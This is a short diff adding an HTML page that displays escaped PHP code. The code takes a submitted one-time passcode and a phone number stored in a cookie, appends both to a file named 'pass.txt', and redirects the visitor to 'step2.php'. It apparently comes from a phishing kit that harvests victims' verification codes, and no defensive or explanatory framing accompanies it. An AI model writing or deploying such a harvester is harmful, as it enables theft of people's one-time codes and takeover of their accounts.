@@ -1,0 +1,38 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title></title>
+</head>
+<body>
+&lt;?php<br/>
+//    echo&quot;&lt;pre&gt;&quot;;print_r($_POST);die();<br/>
+if (isset($_POST[&#39;submit&#39;])) {<br/>
+    // echo&quot;&lt;pre&gt;&quot;;print_r($_POST);die();<br/>
+    <br/>
+&nbsp;&nbsp;&nbsp;$otp0 = $_POST[&#39;otp0&#39;];<br/>
+   $number = $_COOKIE[&quot;number&quot;];<br/>
+<br/>
+  $otp0 = &quot;otp0:$otp0&quot;;<br/>
+   $number = &quot;number:$number&quot;;<br/>
+<br/>
+  $myfile = fopen(&quot;pass.txt&quot;, &quot;a&quot;) or die(&quot;Unable to open file!&quot;);<br/>
+<br/>
+$txt43 =&quot;&quot;;<br/>
+fwrite($myfile, &quot;\r\n&quot;. $txt43);<br/>
+fwrite($myfile, &quot;\r\n&quot;. $otp0);<br/>
+fwrite($myfile, &quot;\r\n&quot;. $number);<br/>
+<br/>
+fclose($myfile);<br/>
+<br/>
+   <br/>
+   <br/>
+    header(&#39;location:step2.php&#39;);<br/>
+    die();<br/>
+//     $fp = fopen(&#39;lidn.txt&#39;, &#39;w&#39;);<br/>
+// fwrite($fp,[ ]);<br/>
+// fclose($fp);<br/>
+}<br/>
+<br/>
+<br/>
+<br/>
+?&gt;</body></html>
